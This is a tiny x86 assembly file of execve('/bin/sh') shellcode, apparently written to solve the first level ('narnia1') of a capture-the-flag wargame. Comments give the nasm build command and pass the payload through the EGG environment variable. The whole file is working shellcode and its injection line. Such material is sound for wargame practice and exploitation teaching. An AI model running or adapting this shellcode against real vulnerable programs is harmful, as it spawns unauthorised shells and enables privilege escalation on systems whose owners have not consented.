; execve
; eax: 0x0b, ebx: char *
; nasm -f bin execve_sh_raw.asm
; EGG=`cat execve_sh_raw.o` ./narnia1

BITS 32
xor eax,eax
push eax
push 0x68732f6e     ;n/sh
push 0x69622f2f     ;//bi
mov ebx,esp         ;pointer to our string
push eax
mov ecx, esp
mov edx, esp
mov al,11          ;sys_execve
int 0x80
